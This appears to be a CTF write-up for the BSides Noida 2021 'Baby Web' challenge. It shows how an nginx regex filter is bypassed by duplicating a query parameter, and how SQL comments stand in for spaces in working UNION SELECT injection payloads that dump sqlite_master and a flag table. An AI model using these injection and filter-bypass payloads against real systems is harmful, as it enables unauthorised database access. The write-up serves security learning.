# Baby Web

#### Category : Web
#### Points : 420 (68 solves)
#### Author : Karma

## Problem
Just a place to see list of all challs from bsides noida CTF, maybe some flag too xD
Note : Bruteforce is not required.

[Link](http://ctf.babyweb.bsidesnoida.in/)

[Sauce](https://storage.googleapis.com/noida_ctf/Web/baby_web.zip)

## Solution

Downloading the source and hosting it in a docker locally, we see that this website takes a parameter `chall_id`

<img src="https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BSides%20Noida/Baby%20Web/baby_web_site.png">

Looking at the `index.php` file, we see that the following sql query is being executed.

<img src="https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BSides%20Noida/Baby%20Web/sql_query.png">

But if we try to put an alphabet in the parameter `chall_id`, we get an error.

<img src="https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BSides%20Noida/Baby%20Web/baby_web_error.png">

Looking at `config/ctf.conf` in the source code, there is some regex that is used to prevent alphabets and white spaces.

<img src="https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BSides%20Noida/Baby%20Web/baby_web_regex.png">

To bypass this we can use two parameters so that first one is processed by nginx and second one bypasses it.

```html
GET /?chall_id=1&chall_id=a
```

<img src="https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BSides%20Noida/Baby%20Web/nginx_bypass.png">

And to bypass the white space restriction we can use comments.

So instead of  `UNION SELECT`, we use `UNION/**/SELECT`

### Listing columns and tables
From opening `karma.db`(from source code) in sqlite browser, we see that it has 6 columns.

To list columns and tables, I used the following payload

```html
GET /?chall_id=1&chall_id=1/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL,sql/**/FROM/**/sqlite_master
```

Using this payload we get a table named `flagsss` and column named `flag`

<img src="https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BSides%20Noida/Baby%20Web/getting_tables_columns.png">

Now, we can use the following query to retrieve the flag.

```html
GET /?chall_id=1&chall_id=1/**/UNION/**/SELECT/**/NULL,NULL,NULL,NULL,NULL,flag/**/FROM/**/flagsss
```

<img src="https://github.com/p1xxxel/ctf-writeups/blob/main/2021/BSides%20Noida/Baby%20Web/flag_query.png">

So the flag is `BSNoida{4_v3ry_w4rm_w31c0m3_2_bs1d35_n01d4}`